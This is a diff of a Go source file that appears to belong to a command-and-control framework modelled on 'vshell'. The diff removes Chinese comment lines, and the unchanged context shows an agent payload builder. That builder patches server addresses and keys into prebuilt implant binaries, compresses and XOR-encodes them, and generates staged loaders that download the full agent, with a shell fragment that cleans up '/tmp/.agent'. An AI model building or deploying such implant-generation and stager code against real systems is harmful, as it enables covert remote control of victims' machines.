@@ -1,4 +1,3 @@
-// Package c2engine/payload 实现 Agent 载荷生成：模板修补、staged 加载器与打包压缩。
 // Package c2engine/payload implements agent payload generation: template patching,
 // staged loaders, and packaging/compression.
 package c2engine
@@ -34,8 +33,6 @@ import (
 // 原版 vshell 为每个平台/架构组合嵌入预编译的 Agent 二进制模板，生成载荷时：
 // 1) 加载模板；2) 修补占位值（服务器地址、验证密钥、加密盐）；
 // 3) gzip 压缩；4) 可选 XOR 编码用于 staging；5) 交付最终载荷。
-
-// AgentTemplate 表示预编译的 Agent 二进制模板。
 // AgentTemplate represents a pre-compiled agent binary template.
 type AgentTemplate struct {
 	Platform   string `json:"platform"`
@@ -46,15 +43,11 @@ type AgentTemplate struct {
 	SHA256     string `json:"sha256"`
 	Path       string `json:"path"`
 }
-
-// TemplateRepository 管理 Agent 二进制模板。
 // TemplateRepository manages agent binary templates.
 type TemplateRepository struct {
 	basePath  string
 	templates map[string]*AgentTemplate // key: platform_arch_mode
 }
-
-// NewTemplateRepository 创建模板仓库。
 // NewTemplateRepository creates a template repository.
 func NewTemplateRepository(basePath string) *TemplateRepository {
 	return &TemplateRepository{
@@ -62,8 +55,6 @@ func NewTemplateRepository(basePath string) *TemplateRepository {
 		templates: make(map[string]*AgentTemplate),
 	}
 }
-
-// ScanTemplates 扫描 agents 目录寻找模板二进制。
 // ScanTemplates scans the agents directory for template binaries.
 func (tr *TemplateRepository) ScanTemplates() error {
 	// Look for agent binaries in agents/ directory
@@ -140,8 +131,6 @@ func (tr *TemplateRepository) hashFile(path string) string {
 	h := sha256.Sum256(data)
 	return hex.EncodeToString(h[:])
 }
-
-// GetTemplate 返回指定平台/架构/模式的模板。
 // GetTemplate returns a template for the given platform/arch/mode.
 func (tr *TemplateRepository) GetTemplate(platform, arch, mode string) *AgentTemplate {
 	key := tr.templateKey(platform, arch, mode)
@@ -151,20 +140,14 @@ func (tr *TemplateRepository) GetTemplate(platform, arch, mode string) *AgentTem
 // ============================================================================
 // Payload builder - generates agent binaries from templates
 // ============================================================================
-
-// PayloadBuilder 生成嵌入配置的 Agent 载荷。
 // PayloadBuilder generates agent payloads with embedded configuration.
 type PayloadBuilder struct {
 	repo *TemplateRepository
 }
-
-// NewPayloadBuilder 创建载荷生成器。
 // NewPayloadBuilder creates a payload builder.
 func NewPayloadBuilder(repo *TemplateRepository) *PayloadBuilder {
 	return &PayloadBuilder{repo: repo}
 }
-
-// BuildPayload 创建配置好的 Agent 二进制。
 // BuildPayload creates a configured agent binary.
 func (pb *PayloadBuilder) BuildPayload(info *AgentBuildInfo, listener *Listener, options map[string]string) ([]byte, error) {
 	if listener == nil {
@@ -394,16 +377,12 @@ func alignToFile(size, align uint32) uint32 {
 // ============================================================================
 // Staged payload generation
 // ============================================================================
-
-// StagedLoader 生成小型 staged 加载器，负责下载完整 Agent。
 // StagedLoader generates a small staged loader that downloads the full agent.
 type StagedLoader struct {
 	DownloadURL string
 	Platform    string
 	Arch        string
 }
-
-// GenerateStagedLoader 为指定平台生成 staged 下载器。
 // GenerateStagedLoader generates a staged downloader for the given platform.
 func (sl *StagedLoader) GenerateStagedLoader() ([]byte, error) {
 	switch sl.Platform {
@@ -440,8 +419,6 @@ rm -f /tmp/.agent`,
 // ============================================================================
 // Payload packaging (ZIP/gzip)
 // ============================================================================
-
-// PackagePayload 包装载荷以便投递（ZIP/gzip）。
 // PackagePayload wraps a payload for delivery.
 func PackagePayload(data []byte, filename string, compression string) ([]byte, string, error) {
 	switch compression {
@@ -476,8 +453,6 @@ func zipPayload(data []byte, filename string) ([]byte, string, error) {
 	w.Close()
 	return buf.Bytes(), filename + ".zip", nil
 }
-
-// DecompressGzipPayload 解压 gzip 载荷。
 // DecompressGzipPayload decompresses a gzip payload.
 func DecompressGzipPayload(data []byte) ([]byte, error) {
 	r, err := gzip.NewReader(bytes.NewReader(data))
@@ -491,8 +466,6 @@ func DecompressGzipPayload(data []byte) ([]byte, error) {
 // ============================================================================
 // Agent binary export
 // ============================================================================
-
-// ExportAgent 将构建好的 Agent 载荷保存到 agents 目录。
 // ExportAgent saves a built agent payload to the agents directory.
 func ExportAgent(data []byte, info *AgentBuildInfo, listenerID int64) (string, error) {
 	dir := fmt.Sprintf("agents/export/%d", listenerID)
